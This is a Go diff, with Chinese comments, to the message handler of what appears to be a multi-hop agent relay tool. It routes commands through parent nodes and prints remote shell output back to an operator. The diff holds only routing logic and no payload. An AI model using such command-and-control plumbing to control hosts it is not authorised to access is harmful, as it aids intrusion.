@@ -158,17 +158,91 @@ func handleAgentMessages(n *node.Node, registry *node.Registry) {
 				log.Printf("[-] RelayPacket decode failed: %v", err)
 				return
 			}
-			target, ok := registry.Get(pkt.DestID)
-			if !ok {
-				log.Printf("[-] Unknown target ID %d for relay", pkt.DestID)
+
+			// 尝试解嵌套 Message
+			innerMsg, err := protocol.DecodeMessage(pkt.Data)
+			if err != nil {
+				log.Printf("[-] Failed to decode inner message: %v", err)
 				return
 			}
-			_, err := target.Conn.Write(pkt.Data)
-			if err != nil {
-				log.Printf("[-] Relay forward to %d failed: %v", pkt.DestID, err)
-				registry.Remove(pkt.DestID)
-				registry.NodeGraph.RemoveNode(pkt.DestID)
+
+			// ✅ 判断 inner 消息类型，决定是上传的“响应”，还是需要继续转发的“命令”
+			switch innerMsg.Type {
+			case protocol.MsgResponse, protocol.MsgShell:
+				// 回传路径：打印结果
+				switch innerMsg.Type {
+				case protocol.MsgResponse:
+					log.Printf("[#] Node %d response:\n%s", pkt.DestID, string(innerMsg.Payload))
+
+				case protocol.MsgShell:
+					fmt.Print(string(innerMsg.Payload))
+
+				default:
+					log.Printf("[-] Unknown inner message type from node %d: %s", pkt.DestID, innerMsg.Type)
+				}
+			default:
+				// 下发路径：继续向目标 relay 转发
+				parentID := registry.NodeGraph.GetParent(pkt.DestID)
+				if parentID == -1 {
+					log.Printf("[-] No parent found for dest ID %d", pkt.DestID)
+					return
+				}
+				parentNode, ok := registry.Get(parentID)
+				if !ok || parentNode.Conn == nil {
+					log.Printf("[-] Cannot forward to %d: no relay node found", pkt.DestID)
+					return
+				}
+
+				// 保留原始封装继续发送
+				fwdMsg := protocol.Message{
+					Type:    protocol.MsgRelayPacket,
+					Payload: msg.Payload,
+				}
+				buf, err := protocol.EncodeMessage(fwdMsg)
+				if err != nil {
+					log.Printf("[-] Failed to encode relay forward: %v", err)
+					return
+				}
+				_, err = parentNode.Conn.Write(buf)
+				if err != nil {
+					log.Printf("[-] Failed to relay to %d via %d: %v", pkt.DestID, parentID, err)
+				}
 			}
+
+		// case protocol.MsgRelayPacket:
+		// 	var pkt protocol.RelayPacket
+		// 	if err := json.Unmarshal(msg.Payload, &pkt); err != nil {
+		// 		log.Printf("[-] RelayPacket decode failed: %v", err)
+		// 		return
+		// 	}
+
+		// 	// 尝试寻找下一跳：即该节点的父节点（relay）
+		// 	parentID := registry.NodeGraph.GetParent(pkt.DestID)
+		// 	if parentID == -1 {
+		// 		log.Printf("[-] No parent found for dest ID %d", pkt.DestID)
+		// 		return
+		// 	}
+
+		// 	parentNode, ok := registry.Get(parentID)
+		// 	if !ok || parentNode.Conn == nil {
+		// 		log.Printf("[-] Cannot forward to %d: no relay node found", pkt.DestID)
+		// 		return
+		// 	}
+
+		// 	// 重新封装 relay packet 向下发
+		// 	fwdMsg := protocol.Message{
+		// 		Type:    protocol.MsgRelayPacket,
+		// 		Payload: msg.Payload,
+		// 	}
+		// 	buf, err := protocol.EncodeMessage(fwdMsg)
+		// 	if err != nil {
+		// 		log.Printf("[-] Failed to encode relay forward: %v", err)
+		// 		return
+		// 	}
+		// 	_, err = parentNode.Conn.Write(buf)
+		// 	if err != nil {
+		// 		log.Printf("[-] Failed to relay to %d via %d: %v", pkt.DestID, parentID, err)
+		// 	}
 
 		default:
 			log.Printf("[-] Node %d sent unknown message type: %s", n.ID, msg.Type)
